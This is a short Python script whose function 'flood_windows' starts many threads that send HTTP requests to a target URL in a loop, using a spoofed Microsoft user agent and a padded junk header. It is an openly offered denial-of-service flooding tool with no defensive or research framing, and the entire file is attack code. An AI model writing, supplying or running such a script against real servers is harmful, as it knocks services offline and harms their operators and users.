import threading, time, requests, random

def flood_windows(target, duration=60, threads=100):
    headers = {
        "User-Agent": "Microsoft-CryptoAPI/10.0",
        "X-Malform": "%%FLOOD%%" * 50,
        "Accept-Encoding": "gzip, deflate",
    }

    def attack_loop():
        end = time.time() + duration
        while time.time() < end:
            try:
                requests.get(target, headers=headers, timeout=2)
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=attack_loop).start()

    print(f"🧨 Windows flood targeting {target} for {duration}s with {threads} threads.")
